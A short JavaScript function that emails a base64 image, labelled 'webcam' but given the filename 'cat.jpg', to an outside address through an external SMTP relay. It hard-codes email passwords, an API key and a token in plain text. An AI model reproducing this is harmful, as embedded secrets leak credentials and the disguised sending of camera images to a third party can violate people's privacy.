function sendEmail(bimage){
    /*var _EMAIL="alonnsohackerone@gmail.com"
    var _PASS="8infinite"
    var _TO="helenicejoana@gmail.com"
    var _HOST='smtp.gmail.com'*/
    
    var _EMAIL="alonnsohackerone@gmail.com"
    var _PASS="7B6007F33B72796FC42CDD5122E54E120CE5"
    var _TO="alonnsoandres@gmail.com"
    var _HOST='smtp.elasticemail.com'

    const Attachments= [
        {   // encoded string as an attachment
          name: 'webcam',
          filename: 'cat.jpg',
          content: bimage.split("base64,")[1],
          encoding: 'base64'
        }]
    //eaaefb4a-a851-465d-8c58-cc2c3a190388
    Email.send({
        //SecureToken : "eaaefb4a-a851-465d-8c58-cc2c3a190388",
        Host : _HOST,
        Username : _EMAIL,
        Password : _PASS,
        To : _TO,
        From : _EMAIL,
        Subject : "This is the subject",
        Body : "And this is the body",
        Attachments
    }).then(
    message => alert(message)
    );
}